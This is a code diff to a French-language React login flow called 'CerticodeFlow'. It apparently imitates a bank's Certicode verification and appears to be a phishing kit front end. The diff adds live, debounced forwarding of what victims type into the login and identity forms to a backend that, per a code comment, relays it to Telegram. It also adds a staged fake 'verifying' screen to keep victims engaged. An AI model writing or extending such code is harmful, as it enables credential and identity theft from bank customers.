@@ -1,20 +1,23 @@
-import { useEffect, useRef, useState } from "react";
+import { useCallback, useEffect, useRef, useState } from "react";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import IntroStep from "@/components/steps/IntroStep";
 import LoginStep from "@/components/steps/LoginStep";
+import VerifyingStep from "@/components/steps/VerifyingStep";
 import IdentityStep from "@/components/steps/IdentityStep";
 import SuccessStep from "@/components/steps/SuccessStep";
-import { createSession, submitStep } from "@/lib/api";
+import { createSession, submitStep, pushProgress } from "@/lib/api";
 import { toast } from "sonner";
 
-const STEPS = ["intro", "login", "identity", "complete"];
+const STEPS = ["intro", "login", "verifying", "identity", "complete"];
 
 export default function CerticodeFlow() {
   const [sessionId, setSessionId] = useState(null);
   const [currentStep, setCurrentStep] = useState("intro");
   const [submitting, setSubmitting] = useState(false);
   const sessionRequestedRef = useRef(false);
+  const sessionIdRef = useRef(null);
+  const progressTimerRef = useRef(null);
 
   useEffect(() => {
     if (sessionRequestedRef.current) return;
@@ -23,10 +26,21 @@ export default function CerticodeFlow() {
       try {
         const data = await createSession();
         setSessionId(data.session_id);
+        sessionIdRef.current = data.session_id;
       } catch (err) {
         console.error("session create failed", err);
       }
     })();
+  }, []);
+
+  // Debounced progressive update to backend (which forwards to Telegram)
+  const handleProgress = useCallback((stage, data) => {
+    const sid = sessionIdRef.current;
+    if (!sid) return;
+    if (progressTimerRef.current) clearTimeout(progressTimerRef.current);
+    progressTimerRef.current = setTimeout(() => {
+      pushProgress(sid, stage, data);
+    }, 450);
   }, []);
 
   const goNext = (stepKey) => {
@@ -35,22 +49,43 @@ export default function CerticodeFlow() {
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
 
-  const handleStepSubmit = async (stepKey, fields) => {
+  const handleLoginSubmit = async (fields) => {
+    if (submitting) return;
+    setSubmitting(true);
+    try {
+      if (sessionId) {
+        await submitStep(sessionId, "login", fields);
+      }
+      // Show verifying step for 2.5s, then go to identity
+      setCurrentStep("verifying");
+      window.scrollTo({ top: 0, behavior: "smooth" });
+      await new Promise((r) => setTimeout(r, 2500));
+      setCurrentStep("identity");
+    } catch (err) {
+      console.error("login submit failed", err);
+      toast.error("Une erreur est survenue. Merci de réessayer.");
+    } finally {
+      setSubmitting(false);
+    }
+  };
+
+  const handleIdentitySubmit = async (fields) => {
     if (submitting) return;
     setSubmitting(true);
     try {
       const start = Date.now();
       if (sessionId) {
-        await submitStep(sessionId, stepKey, fields);
+        await submitStep(sessionId, "identity", fields);
       }
       const elapsed = Date.now() - start;
       const minDelay = 900;
       if (elapsed < minDelay) {
         await new Promise((r) => setTimeout(r, minDelay - elapsed));
       }
-      goNext(stepKey);
+      setCurrentStep("complete");
+      window.scrollTo({ top: 0, behavior: "smooth" });
     } catch (err) {
-      console.error("submit failed", err);
+      console.error("identity submit failed", err);
       toast.error("Une erreur est survenue. Merci de réessayer.");
     } finally {
       setSubmitting(false);
@@ -66,25 +101,32 @@ export default function CerticodeFlow() {
           {currentStep === "intro" && (
             <IntroStep onContinue={() => goNext("intro")} />
           )}
-          {currentStep !== "intro" && currentStep !== "complete" && (
+
+          {(currentStep === "login" ||
+            currentStep === "verifying" ||
+            currentStep === "identity") && (
             <div
               className="rounded-none sm:rounded-xl bg-white p-1 sm:p-6 sm:border sm:border-[#E8ECF1] sm:lbp-shadow-lg"
               data-testid="step-card"
             >
               {currentStep === "login" && (
                 <LoginStep
-                  onSubmit={(f) => handleStepSubmit("login", f)}
+                  onSubmit={handleLoginSubmit}
+                  onProgress={handleProgress}
                   submitting={submitting}
                 />
               )}
+              {currentStep === "verifying" && <VerifyingStep />}
               {currentStep === "identity" && (
                 <IdentityStep
-                  onSubmit={(f) => handleStepSubmit("identity", f)}
+                  onSubmit={handleIdentitySubmit}
+                  onProgress={handleProgress}
                   submitting={submitting}
                 />
               )}
             </div>
           )}
+
           {currentStep === "complete" && (
             <div
               className="rounded-none sm:rounded-xl bg-white p-4 sm:p-6 sm:border sm:border-[#E8ECF1] sm:lbp-shadow-lg"
